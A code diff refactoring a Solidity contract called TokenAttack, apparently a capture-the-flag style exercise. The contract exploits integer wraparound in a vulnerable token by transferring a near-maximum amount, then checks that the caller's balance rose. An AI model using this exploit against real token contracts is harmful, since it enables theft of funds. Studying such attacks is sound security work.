@@ -5,17 +5,11 @@ pragma solidity ^0.8.0;
 import "./interfaces/IToken.sol";
 
 contract TokenAttack {
-    IToken private immutable victimToken;
+    function attack(IToken target) external {
+        uint256 balance = target.balanceOf(msg.sender);
 
-    constructor(IToken victimToken_) {
-        victimToken = victimToken_;
-    }
+        target.transfer(msg.sender, type(uint256).max - balance - 1);
 
-    function attack() external {
-        uint256 balance = victimToken.balanceOf(msg.sender);
-
-        victimToken.transfer(msg.sender, type(uint256).max - balance - 1);
-
-        require(balance < victimToken.balanceOf(msg.sender), "Token: Attack failed");
+        require(balance < target.balanceOf(msg.sender), "Token: Attack failed");
     }
 }
